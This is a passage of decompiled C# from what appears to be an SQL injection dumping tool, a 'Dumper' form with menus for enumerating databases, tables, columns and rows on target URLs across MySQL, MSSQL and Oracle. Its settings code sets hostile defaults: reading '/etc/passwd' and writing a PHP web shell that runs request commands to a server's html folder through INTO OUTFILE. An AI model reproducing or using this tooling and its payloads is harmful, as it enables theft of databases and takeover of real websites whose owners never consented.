			mnuTreeSP3.Visible = false;
			mnuRemDB.Visible = false;
			mnuRemTable.Visible = false;
			mnuRemColumn.Visible = false;
			mnuTreeSP4.Visible = false;
			mnuAddDB.Visible = true;
			mnuAddTable.Visible = false;
			mnuAddColumn.Visible = false;
			mnuTreeSP5.Visible = false;
			mnuCollapseTree.Visible = false;
			mnuSortTree.Visible = false;
		}
		else if (flag == (trwSchema.SelectedNode != null))
		{
			TreeNode selectedNode = trwSchema.SelectedNode;
			mnuCountDBs.Visible = true;
			mnuCountTables.Visible = selectedNode.Level == 0;
			mnuCountTablesAll.Visible = selectedNode.Level == 0;
			mnuCountColumns.Visible = selectedNode.Level == 1;
			mnuCountColumnsAll.Visible = selectedNode.Level == 1;
			mnuCountRows.Visible = selectedNode.Level == 1;
			mnuCountRowsAll.Visible = selectedNode.Level == 1;
			mnuCountSP.Visible = true;
			mnuCopyDB.Visible = selectedNode.Level == 0;
			mnuCopyTable.Visible = selectedNode.Level == 1;
			bool visible = ((selectedNode.Level == 1) & (selectedNode.Nodes.Count > 1)) | (selectedNode.Level == 2 && selectedNode.Parent.Nodes.Count > 1);
			mnuUnCheckAllColumns.Visible = visible;
			mnuCheckAllColumns.Visible = visible;
			mnuCheckRevert.Visible = visible;
			mnuCheckAllSP.Visible = visible;
			mnuCopyColumn.Visible = selectedNode.Level == 2;
			mnuCopyAllNodes.Visible = selectedNode.Nodes.Count > 0;
			mnuCopyAllSchema.Visible = true;
			mnuClearNodes.Visible = selectedNode.Nodes.Count > 0;
			mnuClearSchema.Visible = true;
			mnuRemDB.Visible = selectedNode.Level == 0;
			mnuRemTable.Visible = selectedNode.Level == 1;
			mnuRemColumn.Visible = selectedNode.Level == 2;
			mnuAddDB.Visible = selectedNode.Level == 0;
			mnuAddTable.Visible = selectedNode.Level == 0;
			mnuAddColumn.Visible = (selectedNode.Level >= 1) & (selectedNode.Level != 3);
			mnuCollapseTree.Visible = true;
			mnuSortTree.Visible = true;
			Application.DoEvents();
			mnuTreeSP1.Visible = selectedNode.Level != 3;
			mnuTreeSP2.Visible = (selectedNode.Nodes.Count > 0) | (selectedNode.Level != 3);
			mnuTreeSP3.Visible = (selectedNode.Nodes.Count > 0) | (selectedNode.Level != 3);
			mnuTreeSP4.Visible = selectedNode.Level != 3;
			mnuTreeSP5.Visible = true;
		}
		else
		{
			mnuCountDBs.Visible = true;
			mnuCountSP.Visible = true;
		}
	}

	private void method_62(object sender, EventArgs e)
	{
		TreeNode selectedNode = trwSchema.SelectedNode;
		if (selectedNode == null)
		{
			return;
		}
		if (selectedNode.Level == 1)
		{
			foreach (TreeNode node in selectedNode.Nodes)
			{
				if (sender == mnuCheckRevert)
				{
					node.Checked = !node.Checked;
				}
				else
				{
					node.Checked = sender == mnuCheckAllColumns;
				}
			}
			return;
		}
		if (selectedNode.Level != 2)
		{
			return;
		}
		foreach (TreeNode node2 in selectedNode.Parent.Nodes)
		{
			if (sender == mnuCheckRevert)
			{
				node2.Checked = !node2.Checked;
			}
			else
			{
				node2.Checked = sender == mnuCheckAllColumns;
			}
		}
	}

	private void method_63(object sender, EventArgs e)
	{
		TreeNode selectedNode = trwSchema.SelectedNode;
		if (selectedNode != null)
		{
			try
			{
				Clipboard.SetText(method_41(selectedNode.Text));
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_64(object sender, EventArgs e)
	{
		TreeNode selectedNode = trwSchema.SelectedNode;
		if (selectedNode == null)
		{
			return;
		}
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine(selectedNode.Text);
			foreach (TreeNode node in selectedNode.Nodes)
			{
				stringBuilder.AppendLine("\t" + method_41(node.Text));
			}
			Clipboard.SetText(stringBuilder.ToString());
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			ProjectData.ClearProjectError();
		}
	}

	private void method_65(object sender, EventArgs e)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			foreach (TreeNode node in trwSchema.Nodes)
			{
				stringBuilder.AppendLine(method_41(node.Text));
				foreach (TreeNode node2 in node.Nodes)
				{
					stringBuilder.AppendLine("\t" + method_41(node2.Text));
					foreach (TreeNode node3 in node2.Nodes)
					{
						_ = node3;
						stringBuilder.AppendLine("\t\t" + method_41(node2.Text));
					}
				}
			}
			Clipboard.SetText(stringBuilder.ToString());
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			ProjectData.ClearProjectError();
		}
	}

	private void method_66(object sender, EventArgs e)
	{
		TreeNode selectedNode = trwSchema.SelectedNode;
		if (selectedNode != null)
		{
			try
			{
				selectedNode.Nodes.Clear();
				selectedNode.ToolTipText = "";
				method_56(null, null);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
				ProjectData.ClearProjectError();
			}
		}
	}

	internal void method_67(object sender, EventArgs e)
	{
		trwSchema.Nodes.Clear();
		lblCountBDs.Text = "-1";
		method_56(null, null);
	}

	private void method_68(object sender, EventArgs e)
	{
		TreeNode selectedNode = trwSchema.SelectedNode;
		if (selectedNode != null)
		{
			try
			{
				selectedNode.Remove();
				method_56(null, null);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_69(object sender, EventArgs e)
	{
		TreeNode selectedNode = trwSchema.SelectedNode;
		if (!((selectedNode != null) | (sender == mnuAddDB)))
		{
			return;
		}
		try
		{
			bool flag;
			if ((flag = true) == (sender == mnuAddDB))
			{
				Globals.translate_0.GetStr(this, 45);
			}
			else if (flag == (sender == mnuAddTable))
			{
				Globals.translate_0.GetStr(this, 46);
			}
			else if (flag == (sender == mnuAddColumn))
			{
				Globals.translate_0.GetStr(this, 47);
			}
			string text = default(string);
			using (ImpBox impBox = new ImpBox())
			{
				impBox.Text = Conversions.ToString(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null));
				impBox.ShowDialog(this);
				if (impBox.DialogResult == DialogResult.OK)
				{
					text = impBox.txtValue.Text.Trim();
				}
			}
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			if (!method_53(text))
			{
				using (new Class8(Globals.GMain))
				{
					MessageBox.Show("'" + text + "' " + Globals.translate_0.GetStr(this, 49), Conversions.ToString(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null)), MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					return;
				}
			}
			bool flag2;
			if ((flag2 = true) == (sender == mnuAddDB))
			{
				if (method_54(Schema.DATABASES, text))
				{
					using (new Class8(Globals.GMain))
					{
						MessageBox.Show("'" + text + "' " + Globals.translate_0.GetStr(this, 50), Conversions.ToString(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null)), MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					}
				}
				else
				{
					method_47(text);
				}
			}
			else if (flag2 == (sender == mnuAddTable))
			{
				string string_ = selectedNode.FullPath.Split('\\')[0];
				if (method_54(Schema.TABLES, string_, text))
				{
					using (new Class8(Globals.GMain))
					{
						MessageBox.Show("'" + text + "' " + Globals.translate_0.GetStr(this, 51), Conversions.ToString(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null)), MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					}
				}
				else
				{
					method_48(string_, text);
				}
			}
			else if (flag2 == (sender == mnuAddColumn))
			{
				string string_2 = selectedNode.FullPath.Split('\\')[0];
				string string_3 = selectedNode.FullPath.Split('\\')[1];
				if (method_54(Schema.COLUMNS, string_2, string_3, text))
				{
					using (new Class8(Globals.GMain))
					{
						MessageBox.Show("'" + text + "' " + Globals.translate_0.GetStr(this, 52), Conversions.ToString(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null)), MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					}
				}
				else
				{
					method_49(string_2, string_3, text);
				}
			}
			method_56(null, null);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			ProjectData.ClearProjectError();
		}
	}

	private void method_70(object sender, EventArgs e)
	{
		try
		{
			foreach (TreeNode node in trwSchema.Nodes)
			{
				node.Collapse(ignoreChildren: false);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			ProjectData.ClearProjectError();
		}
	}

	private void method_71(object sender, EventArgs e)
	{
		try
		{
			Globals.LockWindowUpdate(trwSchema.Handle);
			method_72(trwSchema);
			method_58();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			ProjectData.ClearProjectError();
		}
		finally
		{
			Globals.LockWindowUpdate(IntPtr.Zero);
		}
	}

	private void method_72(TreeViewExt treeViewExt_0)
	{
		method_73(treeViewExt_0.Nodes);
		foreach (TreeNode node in treeViewExt_0.Nodes)
		{
			method_73(node.Nodes);
			foreach (TreeNode node2 in node.Nodes)
			{
				method_73(node2.Nodes);
				foreach (TreeNode node3 in node2.Nodes)
				{
					method_73(node3.Nodes);
				}
			}
		}
	}

	private void method_73(TreeNodeCollection treeNodeCollection_0)
	{
		TreeNode[] array = new TreeNode[checked(treeNodeCollection_0.Count - 1 + 1)];
		treeNodeCollection_0.CopyTo(array, 0);
		Array.Sort(array, new TreeNodeComparer());
		treeNodeCollection_0.Clear();
		treeNodeCollection_0.AddRange(array);
	}

	private void Dumper_Load(object sender, EventArgs e)
	{
		splData.BringToFront();
		string_2 = Globals.translate_0.GetStr(this, 3);
		string_3 = Globals.translate_0.GetStr(this, 4);
		string_4 = Globals.translate_0.GetStr(this, 5);
		mnuAutoScroll.Text = Globals.translate_0.GetStr(Globals.GMain, 62);
		btnSearchColumn.Text = Globals.GMain.btnSearchColumnStart.Text;
		chkSearchColumnAllDBs.Text = Globals.GMain.chkSearchColumnAllDBs.Text;
		tpSearch.Text = Globals.GMain.btnSQLiSearch.Text;
	}

	internal void method_74()
	{
		method_81(Class50.Class51_0);
	}

	internal void method_75()
	{
		method_80(Class50.Class51_0);
	}

	internal void method_76()
	{
		Globals.GMain.pnlSQLiDumper.SuspendLayout();
		Globals.LockWindowUpdateForced(bState: false);
		Globals.GMain.method_63(bool_5: true);
		Globals.GMain.method_60(bool_5: true);
		Globals.LockWindowUpdateForced(bState: true);
		Globals.GMain.pnlSQLiDumper.ResumeLayout();
		Globals.GMain.pnlSQLiDumper.Refresh();
	}

	internal void method_77()
	{
		try
		{
			tscSchemas.Items.Clear();
			string[] files = Directory.GetFiles(Globals.SCHEMA_PATH, "*.xml");
			foreach (string fileName in files)
			{
				FileInfo fileInfo = new FileInfo(fileName);
				tscSchemas.Items.Add(fileInfo.Name);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			UpDateStatus(ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	internal void method_78(string string_9)
	{
		try
		{
			if (File.Exists(Globals.SCHEMA_PATH + string_9))
			{
				if (string_9.Equals("AppInstencie.Schema"))
				{
					return;
				}
				using (new Class8(Globals.GMain))
				{
					if (MessageBox.Show(Globals.translate_0.GetStr(this, 53) + "\r\n" + Globals.translate_0.GetStr(this, 54), Globals.APP_VERSION, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) != DialogResult.Yes)
					{
						return;
					}
				}
			}
			Class51 class2 = new Class51(Globals.SCHEMA_PATH + string_9);
			method_81(class2);
			class2.method_9();
			class2 = null;
			if (!string_9.Equals("AppInstencie.Schema"))
			{
				method_77();
				UpDateStatus(Globals.translate_0.GetStr(this, 55) + " (" + string_9 + ")");
				tscSchemas.Text = string_9;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			UpDateStatus(ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	internal void method_79(string string_9)
	{
		try
		{
			if (File.Exists(Globals.SCHEMA_PATH + string_9))
			{
				Class51 class51_ = new Class51(Globals.SCHEMA_PATH + string_9);
				method_80(class51_);
				class51_ = null;
				if (string_9.Equals("AppInstencie.Schema"))
				{
					File.Delete(Globals.SCHEMA_PATH + string_9);
				}
				else
				{
					UpDateStatus(Globals.translate_0.GetStr(this, 56) + " (" + string_9 + ")");
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			UpDateStatus(ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	private void method_80(Class51 class51_0)
	{
		Class50.smethod_2(this, class51_0);
		txtURL.Text = Class50.smethod_5(base.Name, txtURL.Name, "", class51_0);
		cmbSqlType.SelectedItem = Class50.smethod_5(base.Name, cmbSqlType.Name, Class54.smethod_5(Types.MySQL_No_Error), class51_0);
		lblVersion.Text = Class50.smethod_5(base.Name, lblVersion.Name, "", class51_0);
		lblCountry.Text = Class50.smethod_5(base.Name, lblCountry.Name, "", class51_0);
		lblCountBDs.Text = Class50.smethod_5(base.Name, lblCountBDs.Name, "-1", class51_0);
		txtMySQLReadFilePath.Text = Class50.smethod_5(base.Name, txtMySQLReadFilePath.Name, "/etc/passwd", class51_0);
		txtMySQLWriteFile.Text = Class50.smethod_5(base.Name, txtMySQLWriteFile.Name, "'<? system($_REQUEST['cmd']); ?>'", class51_0);
		txtMySQLWriteFilePath.Text = Class50.smethod_5(base.Name, txtMySQLWriteFilePath.Name, "'/home/www/HostName_com/html/shell.php'", class51_0);
		cmbMySQLWriteFilePath.SelectedItem = Class50.smethod_5(base.Name, cmbMySQLWriteFilePath.Name, "INTO OUTFILE", class51_0);
		cmbMySQLReadFile.SelectedItem = Class50.smethod_5(base.Name, cmbMySQLReadFile.Name, "HEX", class51_0);
		txtSearchColumn.Text = Class50.smethod_5(base.Name, txtSearchColumn.Name, "mail", class51_0);
		chkSearchColumnAllDBs.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, chkSearchColumnAllDBs.Name, "False", class51_0));
		string_0 = Class50.smethod_5(base.Name, "__CurrentDataBase", "", class51_0);
		string text = Class50.smethod_5(base.Name, trwSchema.Name + ".Selected", "", class51_0);
		if (!string.IsNullOrEmpty(text))
		{
			string[] array = Strings.Split(text, ":");
			TreeNode treeNode = null;
			switch (array.Length)
			{
			case 1:
				treeNode = method_52(Schema.DATABASES, array[0]);
				break;
			case 2:
				treeNode = method_52(Schema.TABLES, array[0], array[1]);
				break;
			case 3:
				treeNode = method_52(Schema.COLUMNS, array[0], array[1], array[2]);
				break;
			}
			if (!Information.IsNothing(treeNode))
			{
				trwSchema.SelectedNode = treeNode;
				treeNode.EnsureVisible();
			}
		}
		string text2 = Class23.smethod_12(txtURL.Text);
		if (Globals.G_DataGP.CountryCodeExist(text2))
		{
			lblCountry.Image = Globals.GMain.imgData.Images[text2 + ".png"];
		}
		if (lblVersion.Text.StartsWith("4"))
		{
			lblVersion.ForeColor = Color.Red;
		}
		else if (!string.IsNullOrEmpty(lblVersion.Text))
		{
			lblVersion.ForeColor = Color.Blue;
		}
		else
		{
			lblVersion.ForeColor = ForeColor;
		}
	}

	private void method_81(Class51 class51_0)
	{
		Class50.smethod_3(this, class51_0);
		Class50.smethod_4(base.Name, txtURL.Name, txtURL.Text, class51_0);
		Class50.smethod_4(base.Name, cmbSqlType.Name, Conversions.ToString(cmbSqlType.SelectedItem), class51_0);
		Class50.smethod_4(base.Name, lblVersion.Name, lblVersion.Text, class51_0);
		Class50.smethod_4(base.Name, lblCountry.Name, lblCountry.Text, class51_0);
		Class50.smethod_4(base.Name, lblCountBDs.Name, lblCountBDs.Text, class51_0);
		Class50.smethod_4(base.Name, txtMySQLReadFilePath.Name, txtMySQLReadFilePath.Text, class51_0);
		Class50.smethod_4(base.Name, txtMySQLWriteFile.Name, txtMySQLWriteFile.Text, class51_0);
		Class50.smethod_4(base.Name, txtMySQLWriteFilePath.Name, txtMySQLWriteFilePath.Text, class51_0);
		Class50.smethod_4(base.Name, cmbMySQLWriteFilePath.Name, Conversions.ToString(cmbMySQLWriteFilePath.SelectedItem), class51_0);
		Class50.smethod_4(base.Name, cmbMySQLReadFile.Name, Conversions.ToString(cmbMySQLReadFile.SelectedItem), class51_0);
		Class50.smethod_4(base.Name, txtSearchColumn.Name, txtSearchColumn.Text, class51_0);
		Class50.smethod_4(base.Name, chkSearchColumnAllDBs.Name, Conversions.ToString(chkSearchColumnAllDBs.Checked), class51_0);
		Class50.smethod_4(base.Name, "__CurrentDataBase", string_0, class51_0);
		if (trwSchema.SelectedNode != null)
		{
			string text = "";
			string[] array = Strings.Split(trwSchema.SelectedNode.FullPath, trwSchema.PathSeparator);
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				string string_ = array[i];
				string_ = method_41(string_);
				if (!string.IsNullOrEmpty(text))
				{
					text += ":";
				}
				text += string_;
			}
			Class50.smethod_4(base.Name, trwSchema.Name + ".Selected", text, class51_0);
		}
		else
		{
			Class50.smethod_4(base.Name, trwSchema.Name + ".Selected", "", class51_0);
		}
	}

	internal bool method_82(string string_9)
	{
		try
		{
			if (File.Exists(Globals.SCHEMA_PATH + string_9))
			{
				File.Delete(Globals.SCHEMA_PATH + string_9);
				UpDateStatus(Globals.translate_0.GetStr(this, 57) + " (" + string_9 + ")");
				return true;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			UpDateStatus(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private void Dumper_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!Globals.IS_DUMP_INSTANCE)
		{
			method_74();
		}
	}

	private void method_83(object sender, EventArgs e)
	{
		if (!bool_2)
		{
			method_79(tscSchemas.Text);
		}
		else
		{
			Interaction.Beep();
		}
	}

	private void method_84(object sender, EventArgs e)
	{
		method_77();
	}

	private void method_85(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(tscSchemas.Text))
		{
			return;
		}
		using (new Class8(Globals.GMain))
		{
			if (MessageBox.Show(Globals.translate_0.GetStr(this, 58) + " '" + tscSchemas.Text + "'?", Globals.APP_VERSION, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes && method_82(tscSchemas.Text))
			{
				tscSchemas.Items.Remove(tscSchemas.Text);
			}
		}
	}

	private void method_86(object sender, EventArgs e)
	{
		string text = "";
		checked
		{
			try
			{
				int num = 1;
				byte b = 0;
				char[] array = txtURL.Text.ToCharArray();
				foreach (char c in array)
				{
					if (Operators.CompareString(Conversions.ToString(c), "/", TextCompare: false) == 0)
					{
						b++;
						if (b > 2)
						{
							break;
						}
					}
					num++;
				}
				text = txtURL.Text.Substring(0, num - 1);
				text = text.Replace("http://", "");
				text = text.Replace("https://", "");
				text = text.Replace("/", "");
				text = text.Replace("\\", "");
				text = text.Replace(":", "_");
				text = text.Replace("www.", "");
				using (ImpBox impBox = new ImpBox())
				{
					impBox.Text = Globals.translate_0.GetStr(this, 60);
					impBox.txtValue.Text = text;
					impBox.ShowDialog(this);
					text = ((impBox.DialogResult != DialogResult.OK) ? "" : impBox.txtValue.Text.Trim());
				}
				if (!string.IsNullOrEmpty(text) && !text.ToLower().EndsWith(".xml"))
				{
					text += ".xml";
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (!string.IsNullOrEmpty(text))
			{
				method_78(text);
			}
		}
	}

	private void method_87(object sender, EventArgs e)
	{
		string text = Clipboard.GetText();
		if (text.ToLower().StartsWith("http"))
		{
			txtURL.Text = text;
		}
	}

	private void method_88(object sender, EventArgs e)
	{
		method_0(Enum5.const_7);
	}

	private void method_89(object sender, EventArgs e)
	{
		method_0(Enum5.const_8);
	}

	internal void method_90(object sender, EventArgs e)
	{
		method_0(Enum5.const_0);
	}

	private void method_91(object sender, EventArgs e)
	{
		method_0(Enum5.const_1);
	}

	private void method_92(object sender, EventArgs e)
	{
		method_0(Enum5.const_2);
	}

	private void method_93(object sender, EventArgs e)
	{
		method_0(Enum5.const_3);
	}

	private void method_94(object sender, EventArgs e)
	{
		bool_4 = true;
		method_0(Enum5.const_4);
	}

	private void method_95(object sender, EventArgs e)
	{
		method_0(Enum5.const_5);
	}

	private void method_96(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				TreeNode treeNode = trwSchema.SelectedNode.Parent;
				TreeNode treeNode2 = (TreeNode)trwSchema.SelectedNode.Clone();
				int index = trwSchema.SelectedNode.Index;
				if (sender == btnColumnUp)
				{
					if (index != 0)
					{
						trwSchema.SelectedNode.Remove();
						treeNode.Nodes.Insert(index - 1, treeNode2);
					}
				}
				else if (index != treeNode.Nodes.Count - 1)
				{
					trwSchema.SelectedNode.Remove();
					treeNode.Nodes.Insert(index + 1, treeNode2);
				}
				trwSchema.SelectedNode = treeNode2;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_97(object sender, EventArgs e)
	{
		cmbMSSQLCast.Enabled = chkMSSQLCastAsChar.Checked;
	}

	private void method_98(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 191:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001e;
						case 4:
							goto IL_002c;
						case 5:
							goto IL_003a;
						case 6:
							goto IL_0056;
						case 7:
						case 8:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 9:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_002c:
					num = 4;
					btnDumpCustom.Enabled = flag;
					goto IL_003a;
					IL_003a:
					num = 5;
					if (!(!flag & !string.IsNullOrEmpty(txtURL.Text)))
					{
						break;
					}
					goto IL_0056;
					IL_001e:
					num = 3;
					btnServerInfo.Enabled = flag;
					goto IL_002c;
					IL_0056:
					num = 6;
					UpDateStatus(Globals.translate_0.GetStr(this, 61));
					break;
					IL_000a:
					num = 2;
					flag = Class23.smethod_13(txtURL.Text, bool_0: false);
					goto IL_001e;
					end_IL_0001_2:
					break;
				}
				num = 8;
				string_1 = txtURL.Text.Trim();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 191;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_99(object sender, EventArgs e)
	{
		Globals.LockWindowUpdate(splData.Handle);
		types_0 = Class54.smethod_6(Conversions.ToString(cmbSqlType.SelectedItem));
		bool flag = Class54.smethod_9(types_0);
		bool flag2 = Class54.smethod_10(types_0);
		bool flag3 = Class54.smethod_11(types_0);
		bool flag4 = Class54.smethod_12(types_0);
		if (types_0 == Types.MySQL_No_Error)
		{
			if (!tbcMain.TabPages.Contains(tpMyLoadFile))
			{
				tbcMain.TabPages.Add(tpMyLoadFile);
			}
		}
		else if (tbcMain.TabPages.Contains(tpMyLoadFile))
		{
			tbcMain.TabPages.Remove(tpMyLoadFile);
		}
		mnuConvCharGroup.Visible = flag;
		mnuConvHex.Visible = !flag3 && !flag4;
		splQuery.Panel2Collapsed = flag2 || flag3 || flag4;
		lblSelect.Visible = flag;
		grbMySQLCollactions.Visible = flag;
		cmbMySQLErrType.Enabled = types_0 == Types.MySQL_With_Error;
		grbMSSQLCollactions.Visible = flag2;
		grbOracleCollactions.Visible = flag3;
		cmbOracleErrType.Enabled = types_0 == Types.Oracle_With_Error;
		chkDumpEncodedHex.Enabled = types_0 == Types.MySQL_No_Error;
		chkDumpIFNULL.Enabled = flag;
		chkDumpFieldByField.Checked = types_0 == Types.MySQL_With_Error;
		chkDumpFieldByField.Enabled = types_0 == Types.MySQL_No_Error;
		chkAllInOneRequest.Enabled = types_0 == Types.MySQL_No_Error;
		grbMySQLSplitRows.Visible = types_0 == Types.MySQL_With_Error;
		if (flag2)
		{
			numFieldByField.Value = 1m;
			numFieldByField.Maximum = 1m;
		}
		else
		{
			numFieldByField.Maximum = 30m;
		}
		if (sender != null)
		{
			bool flag5;
			if ((flag5 = true) == flag)
			{
				mnuTemplates.DropDown = ctmTemplatesMySQL;
				if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect_0024Init == null)
				{
					Interlocked.CompareExchange(ref _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect_0024Init, new StaticLocalInitFlag(), null);
				}
				bool lockTaken = false;
				try
				{
					Monitor.Enter(_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect_0024Init, ref lockTaken);
					if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect_0024Init.State == 0)
					{
						_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect_0024Init.State = 2;
						_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect = txtCustomQuery.Text;
					}
					else if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect_0024Init.State = 1;
					if (lockTaken)
					{
						Monitor.Exit(_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect_0024Init);
					}
				}
				if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom_0024Init == null)
				{
					Interlocked.CompareExchange(ref _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom_0024Init, new StaticLocalInitFlag(), null);
				}
				bool lockTaken2 = false;
				try
				{
					Monitor.Enter(_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom_0024Init, ref lockTaken2);
					if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom_0024Init.State == 0)
					{
						_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom_0024Init.State = 2;
						_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom = txtCustomQueryFrom.Text;
					}
					else if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom_0024Init.State = 1;
					if (lockTaken2)
					{
						Monitor.Exit(_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom_0024Init);
					}
				}
				txtCustomQuery.Text = _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect;
				_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sSelect = txtCustomQuery.Text;
				txtCustomQueryFrom.Text = _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom;
				_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sFrom = txtCustomQuery.Text;
			}
			else if (flag5 == flag2)
			{
				if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery_0024Init == null)
				{
					Interlocked.CompareExchange(ref _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery_0024Init, new StaticLocalInitFlag(), null);
				}
				bool lockTaken3 = false;
				try
				{
					Monitor.Enter(_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery_0024Init, ref lockTaken3);
					if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery_0024Init.State == 0)
					{
						_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery_0024Init.State = 2;
						_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery = txtCustomQuery.Text;
					}
					else if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
